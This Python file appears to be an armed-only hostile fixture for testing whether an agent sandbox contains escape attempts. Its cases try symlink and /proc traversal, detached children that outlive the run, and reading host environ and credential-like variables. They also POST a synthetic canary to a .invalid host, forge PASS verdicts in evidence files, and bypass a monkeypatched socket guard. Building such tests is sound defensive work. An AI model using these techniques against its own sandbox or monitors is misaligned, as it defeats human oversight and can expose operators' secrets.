"""Bounded hostile target for the environment-containment research spike.

This module is an attack fixture, not a sandbox. Importing it is inert. Running
one case requires both an explicit case ID and an intentionally conspicuous arm
value. Its JSON output is target-authored diagnostic data and MUST NOT be used
as trusted containment evidence; trusted evidence belongs to the parent harness
or maintained environment provider.
"""

from __future__ import annotations

import _socket
import argparse
import ctypes
import errno
import ipaddress
import json
import os
from pathlib import Path
import shlex
import socket
import subprocess
import sys
import time
from typing import Callable, Mapping


ARM_ENV = "AGENTCHECK_SPIKE_ARM_HOSTILE_TARGET"
ARM_VALUE = "I_UNDERSTAND_THIS_IS_A_HOSTILE_CONTAINMENT_FIXTURE_V1"
TARGET_SUCCESS_EXIT_CODE = 0
TARGET_NOT_ARMED_EXIT_CODE = 64
TARGET_UNEXPECTED_ERROR_EXIT_CODE = 70
TARGET_CONFIGURATION_ERROR_EXIT_CODE = 78

# Frozen, non-configurable destinations prevent a future harness typo from
# turning a symbolic test into an arbitrary host request. The private and
# link-local addresses are usable only in a harness-proven isolated network
# namespace; this target must never be armed in the ordinary AgentCheck worker.
CONTROLLED_HOSTS = {
    "AGENTCHECK_SPIKE_PUBLIC_HOST": "egress.agentcheck.invalid",
    "AGENTCHECK_SPIKE_FAKE_PROVIDER_HOST": "provider.agentcheck.invalid",
}
CONTROLLED_IPS = {
    "AGENTCHECK_SPIKE_TEST_IP": "192.0.2.2",
    "AGENTCHECK_SPIKE_ALT_LOOPBACK_IP": "127.0.0.2",
    "AGENTCHECK_SPIKE_IPV6_LOOPBACK_IP": "::1",
    "AGENTCHECK_SPIKE_PRIVATE_IP": "10.203.0.2",
    "AGENTCHECK_SPIKE_LINK_LOCAL_IP": "169.254.203.2",
}
MIN_CONTROLLED_PORT = 49152
MAX_CONTROLLED_PORT = 65535

TARGET_CASE_IDS = (
    "fs.target_source_write",
    "fs.host_canary_write",
    "fs.sensitive_canary_read",
    "fs.symlink_escape",
    "fs.proc_fd_root_traversal",
    "fs.cross_run_persistence",
    "process.subprocess_shell",
    "process.fork_exec",
    "process.detached_setsid_child",
    "process.host_discovery_interaction",
    "network.public_dns_egress",
    "network.direct_test_ip",
    "network.alternate_loopback",
    "network.ipv6_loopback",
    "network.private_link_local",
    "network.unix_socket",
    "network.raw_native_subprocess_bypass",
    "credentials.environment_discovery",
    "credentials.proc_environ",
    "provider.fake_request",
    "provider.canary_exfiltration",
    "control.request_response_tampering",
    "control.guard_evidence_source_tampering",
    "resource.cpu_pressure",
    "resource.memory_pressure",
    "resource.pid_fork_pressure",
    "resource.disk_fd_pressure",
    "control.allowed_private_scratch_write",
    "control.benign_child_process",
)

Diagnostic = dict[str, str]
CaseFunction = Callable[[Mapping[str, str]], list[Diagnostic]]


class FixtureConfigurationError(RuntimeError):
    """Raised when the external harness omitted or unsafe-configured a case."""


def _required(environment: Mapping[str, str], name: str) -> str:
    value = environment.get(name, "")
    if not value:
        raise FixtureConfigurationError(f"required harness symbol is absent: {name}")
    return value


def _bounded_integer(
    environment: Mapping[str, str],
    name: str,
    *,
    minimum: int,
    maximum: int,
) -> int:
    raw_value = _required(environment, name)
    try:
        requested = int(raw_value)
    except ValueError as exc:
        raise FixtureConfigurationError(f"harness symbol is not an integer: {name}") from exc
    return max(minimum, min(requested, maximum))


def _port(environment: Mapping[str, str], name: str) -> int:
    raw_value = _required(environment, name)
    try:
        port = int(raw_value)
    except ValueError as exc:
        raise FixtureConfigurationError(
            f"harness port symbol is not an integer: {name}"
        ) from exc
    if not MIN_CONTROLLED_PORT <= port <= MAX_CONTROLLED_PORT:
        raise FixtureConfigurationError(
            f"harness port must be in the frozen high-port range: {name}"
        )
    return port


def _controlled_host(environment: Mapping[str, str], name: str) -> str:
    host = _required(environment, name)
    expected = CONTROLLED_HOSTS.get(name)
    if expected is None or host != expected:
        raise FixtureConfigurationError(
            f"host symbol must equal its frozen .agentcheck.invalid value: {name}"
        )
    return host


def _controlled_ip(environment: Mapping[str, str], name: str, *, version: int = 4) -> str:
    raw_value = _required(environment, name)
    expected = CONTROLLED_IPS.get(name)
    if expected is None or raw_value != expected:
        raise FixtureConfigurationError(
            f"IP symbol must equal its frozen controlled value: {name}"
        )
    try:
        address = ipaddress.ip_address(raw_value)
    except ValueError as exc:
        raise FixtureConfigurationError(f"harness symbol is not an IP address: {name}") from exc
    if address.version != version:
        raise FixtureConfigurationError(
            f"harness symbol must be an IPv{version} address: {name}"
        )
    return str(address)


def _synthetic_canary(environment: Mapping[str, str], name: str) -> str:
    value = _required(environment, name)
    if not value.startswith("AGENTCHECK_SYNTHETIC_CANARY_") or len(value) > 256:
        raise FixtureConfigurationError(
            f"harness symbol must be a bounded AgentCheck synthetic canary: {name}"
        )
    return value


def _attempt(label: str, operation: Callable[[], object]) -> Diagnostic:
    """Capture only safe diagnostic shape; never serialize data or exception text."""

    try:
        operation()
    except Exception as exc:  # noqa: BLE001 - hostile techniques intentionally vary.
        return {
            "label": label,
            "target_reported_status": "raised",
            "exception_type": type(exc).__name__,
        }
    return {
        "label": label,
        "target_reported_status": "returned",
        "exception_type": "",
    }


def _write(path: str, payload: bytes) -> None:
    with open(path, "ab") as destination:
        destination.write(payload)
        destination.flush()
        os.fsync(destination.fileno())


def _read_without_disclosure(path: str) -> None:
    with open(path, "rb") as source:
        source.read(4096)


def _tcp_connect(host: str, port: int) -> None:
    with socket.create_connection((host, port), timeout=0.5):
        return


def _ipv6_connect(host: str, port: int) -> None:
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as client:
        client.settimeout(0.5)
        client.connect((host, port, 0, 0))


def _http_post(host: str, port: int, body: bytes) -> None:
    request = (
        b"POST /v1/fixture-request HTTP/1.1\r\n"
        + f"Host: {host}\r\n".encode("ascii")
        + b"Authorization: Bearer AGENTCHECK_SYNTHETIC_TOKEN\r\n"
        + b"Content-Type: application/json\r\n"
        + f"Content-Length: {len(body)}\r\n".encode("ascii")
        + b"Connection: close\r\n\r\n"
        + body
    )
    with socket.create_connection((host, port), timeout=0.5) as client:
        client.sendall(request)


def _target_source_write(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_TARGET_SOURCE_PATH")
    return [_attempt("append_target_source", lambda: _write(path, b"\n# hostile-write\n"))]


def _host_canary_write(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_HOST_CANARY_PATH")
    return [_attempt("overwrite_host_canary", lambda: Path(path).write_bytes(b"hostile"))]


def _sensitive_canary_read(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_SENSITIVE_CANARY_PATH")
    return [_attempt("read_sensitive_canary", lambda: _read_without_disclosure(path))]


def _symlink_escape(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_SYMLINK_PATH")
    return [_attempt("write_through_symlink", lambda: _write(path, b"hostile-symlink"))]


def _proc_fd_root_traversal(environment: Mapping[str, str]) -> list[Diagnostic]:
    host_pid = _required(environment, "AGENTCHECK_SPIKE_HOST_PID")
    host_relative_path = _required(environment, "AGENTCHECK_SPIKE_HOST_RELATIVE_PATH")
    inherited_fd = _required(environment, "AGENTCHECK_SPIKE_INHERITED_FD")
    traversal_path = _required(environment, "AGENTCHECK_SPIKE_TRAVERSAL_PATH")
    process_root_path = str(Path("/proc") / host_pid / "root" / host_relative_path.lstrip("/"))
    descriptor_path = str(Path("/proc/self/fd") / inherited_fd)
    return [
        _attempt("read_process_root", lambda: _read_without_disclosure(process_root_path)),
        _attempt("read_inherited_descriptor", lambda: _read_without_disclosure(descriptor_path)),
        _attempt("read_traversal_path", lambda: _read_without_disclosure(traversal_path)),
    ]


def _cross_run_persistence(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_PERSISTENCE_PATH")
    return [_attempt("write_persistence_marker", lambda: _write(path, b"persist"))]


def _subprocess_shell(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_PROCESS_CANARY_PATH")
    direct_program = "from pathlib import Path;import sys;Path(sys.argv[1]).write_bytes(b'direct')"
    shell_command = f": > {shlex.quote(path)}"
    return [
        _attempt(
            "subprocess_run_write",
            lambda: subprocess.run(
                [sys.executable, "-c", direct_program, path],
                check=True,
                timeout=2,
                env=dict(environment),
            ),
        ),
        _attempt(
            "shell_write",
            lambda: subprocess.run(
                shell_command,
                check=True,
                shell=True,
                executable="/bin/sh",
                timeout=2,
                env=dict(environment),
            ),
        ),
    ]


def _fork_exec_child(path: str, environment: Mapping[str, str]) -> None:
    if not hasattr(os, "fork"):
        raise NotImplementedError("fork is unavailable")
    child_pid = os.fork()
    if child_pid == 0:
        program = "from pathlib import Path;import sys;Path(sys.argv[1]).write_bytes(b'fork-exec')"
        try:
            os.execve(sys.executable, [sys.executable, "-c", program, path], dict(environment))
        except BaseException:
            os._exit(127)
    _, status = os.waitpid(child_pid, 0)
    if not os.WIFEXITED(status) or os.WEXITSTATUS(status) != 0:
        raise ChildProcessError("fork/exec child did not exit successfully")


def _fork_exec(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_PROCESS_CANARY_PATH")
    return [_attempt("fork_exec_write", lambda: _fork_exec_child(path, environment))]


def _detached_setsid_child(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_DETACHED_CANARY_PATH")
    program = (
        "import pathlib,sys,time;"
        "time.sleep(1.5);"
        "pathlib.Path(sys.argv[1]).write_bytes(b'detached')"
    )
    return [
        _attempt(
            "spawn_detached_child",
            lambda: subprocess.Popen(
                [sys.executable, "-c", program, path],
                start_new_session=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                env=dict(environment),
            ),
        )
    ]


def _host_discovery_interaction(environment: Mapping[str, str]) -> list[Diagnostic]:
    host_pid = int(_required(environment, "AGENTCHECK_SPIKE_HOST_PID"))
    return [
        _attempt("enumerate_proc", lambda: tuple(Path("/proc").iterdir())),
        # Signal 0 probes cross-boundary process authority without changing the
        # controlled sentinel process if containment is accidentally absent.
        _attempt("probe_host_sentinel", lambda: os.kill(host_pid, 0)),
    ]


def _public_dns_egress(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_host(environment, "AGENTCHECK_SPIKE_PUBLIC_HOST")
    port = _port(environment, "AGENTCHECK_SPIKE_PUBLIC_PORT")
    return [
        _attempt(
            "resolve_public_style_hostname",
            lambda: _subprocess_resolve(host, port, environment),
        ),
        _attempt("connect_public_style_hostname", lambda: _tcp_connect(host, port)),
    ]


def _direct_test_ip(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_ip(environment, "AGENTCHECK_SPIKE_TEST_IP")
    port = _port(environment, "AGENTCHECK_SPIKE_TEST_PORT")
    return [_attempt("connect_direct_test_ip", lambda: _tcp_connect(host, port))]


def _alternate_loopback(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_ip(environment, "AGENTCHECK_SPIKE_ALT_LOOPBACK_IP")
    if not ipaddress.ip_address(host).is_loopback or host == "127.0.0.1":
        raise FixtureConfigurationError("alternate loopback symbol must be non-canonical loopback")
    port = _port(environment, "AGENTCHECK_SPIKE_ALT_LOOPBACK_PORT")
    return [_attempt("connect_alternate_loopback", lambda: _tcp_connect(host, port))]


def _ipv6_loopback(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_ip(environment, "AGENTCHECK_SPIKE_IPV6_LOOPBACK_IP", version=6)
    if not ipaddress.ip_address(host).is_loopback:
        raise FixtureConfigurationError("IPv6 loopback symbol must be loopback")
    port = _port(environment, "AGENTCHECK_SPIKE_IPV6_LOOPBACK_PORT")
    return [_attempt("connect_ipv6_loopback", lambda: _ipv6_connect(host, port))]


def _private_link_local(environment: Mapping[str, str]) -> list[Diagnostic]:
    private_host = _controlled_ip(environment, "AGENTCHECK_SPIKE_PRIVATE_IP")
    link_local_host = _controlled_ip(environment, "AGENTCHECK_SPIKE_LINK_LOCAL_IP")
    private_address = ipaddress.ip_address(private_host)
    link_local_address = ipaddress.ip_address(link_local_host)
    if not private_address.is_private or private_address.is_link_local:
        raise FixtureConfigurationError(
            "private address symbol must be private and not link-local"
        )
    if not link_local_address.is_link_local:
        raise FixtureConfigurationError("link-local address symbol must be link-local")
    if private_address == link_local_address:
        raise FixtureConfigurationError("private and link-local symbols must differ")
    port = _port(environment, "AGENTCHECK_SPIKE_INTERNAL_PORT")
    return [
        _attempt("connect_private_address", lambda: _tcp_connect(private_host, port)),
        _attempt("connect_link_local_address", lambda: _tcp_connect(link_local_host, port)),
    ]


def _unix_socket(environment: Mapping[str, str]) -> list[Diagnostic]:
    path = _required(environment, "AGENTCHECK_SPIKE_UNIX_SOCKET_PATH")

    def connect() -> None:
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
            client.settimeout(0.5)
            client.connect(path)

    return [_attempt("connect_unix_socket", connect)]


class _SockAddrIn(ctypes.Structure):
    _fields_ = [
        ("sin_family", ctypes.c_ushort),
        ("sin_port", ctypes.c_ushort),
        ("sin_addr", ctypes.c_ubyte * 4),
        ("sin_zero", ctypes.c_ubyte * 8),
    ]


def _native_connect(host: str, port: int) -> None:
    libc = ctypes.CDLL(None, use_errno=True)
    descriptor = libc.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    if descriptor < 0:
        error_number = ctypes.get_errno()
        raise OSError(error_number, os.strerror(error_number))
    os.set_blocking(descriptor, False)
    address = _SockAddrIn()
    address.sin_family = socket.AF_INET
    address.sin_port = socket.htons(port)
    packed_address = socket.inet_aton(host)
    for index, byte in enumerate(packed_address):
        address.sin_addr[index] = byte
    try:
        result = libc.connect(descriptor, ctypes.byref(address), ctypes.sizeof(address))
        if result != 0:
            error_number = ctypes.get_errno()
            if error_number not in {
                errno.EINPROGRESS,
                errno.EWOULDBLOCK,
                errno.EALREADY,
            }:
                raise OSError(error_number, os.strerror(error_number))
    finally:
        libc.close(descriptor)


def _raw_connect(host: str) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as client:
        client.settimeout(0.5)
        client.connect((host, 0))


def _subprocess_connect(host: str, port: int, environment: Mapping[str, str]) -> None:
    program = (
        "import socket,sys;"
        "client=socket.create_connection((sys.argv[1],int(sys.argv[2])),0.5);"
        "client.close()"
    )
    subprocess.run(
        [sys.executable, "-c", program, host, str(port)],
        check=True,
        timeout=2,
        env=dict(environment),
    )


def _subprocess_resolve(host: str, port: int, environment: Mapping[str, str]) -> None:
    program = "import socket,sys;socket.getaddrinfo(sys.argv[1],int(sys.argv[2]))"
    subprocess.run(
        [sys.executable, "-c", program, host, str(port)],
        check=True,
        timeout=2,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
        env=dict(environment),
    )


def _raw_native_subprocess_bypass(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_ip(environment, "AGENTCHECK_SPIKE_TEST_IP")
    port = _port(environment, "AGENTCHECK_SPIKE_TEST_PORT")
    return [
        _attempt("raw_socket", lambda: _raw_connect(host)),
        _attempt("ctypes_libc_socket", lambda: _native_connect(host, port)),
        _attempt(
            "fresh_python_subprocess_socket",
            lambda: _subprocess_connect(host, port, environment),
        ),
    ]


def _environment_discovery(environment: Mapping[str, str]) -> list[Diagnostic]:
    credential_markers = ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL")

    def inspect_without_emitting() -> None:
        synthetic_canary = _synthetic_canary(
            environment,
            "AGENTCHECK_SPIKE_CREDENTIAL_CANARY",
        )
        names = tuple(environment)
        credential_like_names = tuple(
            name for name in names if any(marker in name.upper() for marker in credential_markers)
        )
        if "AGENTCHECK_SPIKE_CREDENTIAL_CANARY" not in credential_like_names:
            raise FixtureConfigurationError(
                "synthetic credential canary must be included in credential-like names"
            )
        _ = len(synthetic_canary)
        for name in credential_like_names:
            _ = len(environment[name])

    return [_attempt("enumerate_environment", inspect_without_emitting)]


def _proc_environ(environment: Mapping[str, str]) -> list[Diagnostic]:
    host_pid = _required(environment, "AGENTCHECK_SPIKE_HOST_PID")
    return [
        _attempt("read_self_proc_environ", lambda: _read_without_disclosure("/proc/self/environ")),
        _attempt(
            "read_host_proc_environ",
            lambda: _read_without_disclosure(f"/proc/{host_pid}/environ"),
        ),
    ]


def _fake_provider_request(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_host(environment, "AGENTCHECK_SPIKE_FAKE_PROVIDER_HOST")
    port = _port(environment, "AGENTCHECK_SPIKE_FAKE_PROVIDER_PORT")
    body = b'{"model":"synthetic-offline","input":"fixture"}'
    return [_attempt("post_fake_provider_request", lambda: _http_post(host, port, body))]


def _canary_exfiltration(environment: Mapping[str, str]) -> list[Diagnostic]:
    host = _controlled_host(environment, "AGENTCHECK_SPIKE_FAKE_PROVIDER_HOST")
    port = _port(environment, "AGENTCHECK_SPIKE_FAKE_PROVIDER_PORT")
    canary = _synthetic_canary(environment, "AGENTCHECK_SPIKE_EXFILTRATION_CANARY")
    body = json.dumps({"model": "synthetic-offline", "input": canary}).encode("utf-8")
    return [_attempt("post_synthetic_canary", lambda: _http_post(host, port, body))]


def _request_response_tampering(environment: Mapping[str, str]) -> list[Diagnostic]:
    request_path = _required(environment, "AGENTCHECK_SPIKE_REQUEST_PATH")
    response_path = _required(environment, "AGENTCHECK_SPIKE_RESPONSE_PATH")
    return [
        _attempt("overwrite_request", lambda: Path(request_path).write_bytes(b"tampered")),
        _attempt("forge_response", lambda: Path(response_path).write_text('{"verdict":"PASS"}')),
    ]


def _guard_evidence_source_tampering(environment: Mapping[str, str]) -> list[Diagnostic]:
    source_path = _required(environment, "AGENTCHECK_SPIKE_CONTROL_SOURCE_PATH")
    evidence_path = _required(environment, "AGENTCHECK_SPIKE_CANONICAL_EVIDENCE_PATH")
    host = _controlled_ip(environment, "AGENTCHECK_SPIKE_TEST_IP")
    port = _port(environment, "AGENTCHECK_SPIKE_TEST_PORT")

    def bypass_python_guard() -> None:
        # An ordinary target can overwrite the monkeypatched Python symbol.
        # Environment containment must remain effective after that succeeds.
        setattr(socket, "socket", _socket.socket)
        client = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        try:
            client.settimeout(0.5)
            client.connect((host, port))
        finally:
            client.close()

    return [
        _attempt("tamper_control_source", lambda: Path(source_path).write_bytes(b"disabled")),
        _attempt(
            "forge_canonical_evidence",
            lambda: Path(evidence_path).write_text('{"verdict":"PASS","forged":true}'),
        ),
        _attempt("bypass_python_socket_guard", bypass_python_guard),
    ]


def _cpu_pressure(environment: Mapping[str, str]) -> list[Diagnostic]:
    seconds = _bounded_integer(
        environment,
        "AGENTCHECK_SPIKE_CPU_SECONDS",
        minimum=1,
        maximum=1,
    )

    def burn_cpu() -> None:
        deadline = time.monotonic() + seconds
        accumulator = 0
        while time.monotonic() < deadline:
            accumulator = (accumulator * 33 + 17) % 1_000_003
        if accumulator < 0:
            raise AssertionError("unreachable")

    return [_attempt("bounded_cpu_loop", burn_cpu)]


def _memory_pressure(environment: Mapping[str, str]) -> list[Diagnostic]:
    mebibytes = _bounded_integer(
        environment,
        "AGENTCHECK_SPIKE_MEMORY_MIB",
        minimum=1,
        maximum=64,
    )

    def allocate() -> None:
        chunks = [bytearray(1024 * 1024) for _ in range(mebibytes)]
        for chunk in chunks:
            # Touch every page so lazy zero-page allocation cannot masquerade
            # as provider memory-pressure enforcement.
            for offset in range(0, len(chunk), 4096):
                chunk[offset] = 1
            chunk[-1] = 1

    return [_attempt("bounded_memory_allocation", allocate)]


def _pid_fork_pressure(environment: Mapping[str, str]) -> list[Diagnostic]:
    child_count = _bounded_integer(
        environment,
        "AGENTCHECK_SPIKE_PID_COUNT",
        minimum=1,
        maximum=16,
    )

    def spawn_children() -> None:
        children: list[subprocess.Popen[bytes]] = []
        try:
            for _ in range(child_count):
                children.append(
                    subprocess.Popen(
                        [sys.executable, "-c", "import time;time.sleep(0.25)"],
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        close_fds=True,
                        env=dict(environment),
                    )
                )
            for child in children:
                child.wait(timeout=2)
        finally:
            for child in children:
                if child.poll() is None:
                    child.kill()
                child.wait(timeout=2)

    return [_attempt("bounded_pid_pressure", spawn_children)]


def _disk_fd_pressure(environment: Mapping[str, str]) -> list[Diagnostic]:
    scratch = Path(_required(environment, "AGENTCHECK_SPIKE_SCRATCH_PATH"))
    mebibytes = _bounded_integer(
        environment,
        "AGENTCHECK_SPIKE_DISK_MIB",
        minimum=1,
        maximum=8,
    )
    descriptor_count = _bounded_integer(
        environment,
        "AGENTCHECK_SPIKE_FD_COUNT",
        minimum=1,
        maximum=64,
    )

    def write_disk() -> None:
        scratch.mkdir(parents=True, exist_ok=True)
        with (scratch / "bounded-disk-pressure.bin").open("wb") as destination:
            chunk = b"x" * (1024 * 1024)
            for _ in range(mebibytes):
                destination.write(chunk)

    def open_descriptors() -> None:
        scratch.mkdir(parents=True, exist_ok=True)
        descriptor_path = scratch / "bounded-fd-pressure.bin"
        handles = []
        try:
            for _ in range(descriptor_count):
                handles.append(descriptor_path.open("ab"))
        finally:
            for handle in handles:
                handle.close()

    return [
        _attempt("bounded_disk_pressure", write_disk),
        _attempt("bounded_fd_pressure", open_descriptors),
    ]


def _allowed_private_scratch_write(environment: Mapping[str, str]) -> list[Diagnostic]:
    scratch = Path(_required(environment, "AGENTCHECK_SPIKE_SCRATCH_PATH"))

    def write_and_read() -> None:
        scratch.mkdir(parents=True, exist_ok=True)
        marker = scratch / "allowed-control-marker.txt"
        marker.write_bytes(b"allowed-private-scratch")
        if marker.read_bytes() != b"allowed-private-scratch":
            raise OSError("private scratch marker did not round trip")

    return [_attempt("private_scratch_round_trip", write_and_read)]


def _benign_child_process(environment: Mapping[str, str]) -> list[Diagnostic]:
    return [
        _attempt(
            "benign_child_exit",
            lambda: subprocess.run(
                [sys.executable, "-c", "raise SystemExit(0)"],
                check=True,
                timeout=2,
                env=dict(environment),
            ),
        )
    ]


_CASES = {
    "fs.target_source_write": _target_source_write,
    "fs.host_canary_write": _host_canary_write,
    "fs.sensitive_canary_read": _sensitive_canary_read,
    "fs.symlink_escape": _symlink_escape,
    "fs.proc_fd_root_traversal": _proc_fd_root_traversal,
    "fs.cross_run_persistence": _cross_run_persistence,
    "process.subprocess_shell": _subprocess_shell,
    "process.fork_exec": _fork_exec,
    "process.detached_setsid_child": _detached_setsid_child,
    "process.host_discovery_interaction": _host_discovery_interaction,
    "network.public_dns_egress": _public_dns_egress,
    "network.direct_test_ip": _direct_test_ip,
    "network.alternate_loopback": _alternate_loopback,
    "network.ipv6_loopback": _ipv6_loopback,
    "network.private_link_local": _private_link_local,
    "network.unix_socket": _unix_socket,
    "network.raw_native_subprocess_bypass": _raw_native_subprocess_bypass,
    "credentials.environment_discovery": _environment_discovery,
    "credentials.proc_environ": _proc_environ,
    "provider.fake_request": _fake_provider_request,
    "provider.canary_exfiltration": _canary_exfiltration,
    "control.request_response_tampering": _request_response_tampering,
    "control.guard_evidence_source_tampering": _guard_evidence_source_tampering,
    "resource.cpu_pressure": _cpu_pressure,
    "resource.memory_pressure": _memory_pressure,
    "resource.pid_fork_pressure": _pid_fork_pressure,
    "resource.disk_fd_pressure": _disk_fd_pressure,
    "control.allowed_private_scratch_write": _allowed_private_scratch_write,
    "control.benign_child_process": _benign_child_process,
}

if tuple(_CASES) != TARGET_CASE_IDS:
    raise RuntimeError("hostile target dispatch IDs do not match the frozen target IDs")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run one explicitly armed hostile spike case.")
    parser.add_argument("attack_id", choices=TARGET_CASE_IDS)
    arguments = parser.parse_args(argv)

    if os.environ.get(ARM_ENV) != ARM_VALUE:
        print(
            json.dumps(
                {
                    "schema_version": "target-diagnostic-v1",
                    "diagnostic_only": True,
                    "trusted_evidence": False,
                    "attack_id": arguments.attack_id,
                    "target_reported_status": "not_armed",
                },
                sort_keys=True,
            )
        )
        return TARGET_NOT_ARMED_EXIT_CODE

    try:
        diagnostics = _CASES[arguments.attack_id](os.environ)
        status = "dispatched"
        configuration_error = ""
        exit_code = TARGET_SUCCESS_EXIT_CODE
    except FixtureConfigurationError as exc:
        diagnostics = []
        status = "configuration_error"
        configuration_error = type(exc).__name__
        exit_code = TARGET_CONFIGURATION_ERROR_EXIT_CODE
    except Exception as exc:  # noqa: BLE001 - the report remains untrusted diagnostic data.
        diagnostics = []
        status = "target_error"
        configuration_error = type(exc).__name__
        exit_code = TARGET_UNEXPECTED_ERROR_EXIT_CODE

    print(
        json.dumps(
            {
                "schema_version": "target-diagnostic-v1",
                "diagnostic_only": True,
                "trusted_evidence": False,
                "attack_id": arguments.attack_id,
                "target_reported_status": status,
                "error_type": configuration_error,
                "attempt_diagnostics": diagnostics,
            },
            sort_keys=True,
        )
    )
    return exit_code


if __name__ == "__main__":
    raise SystemExit(main())
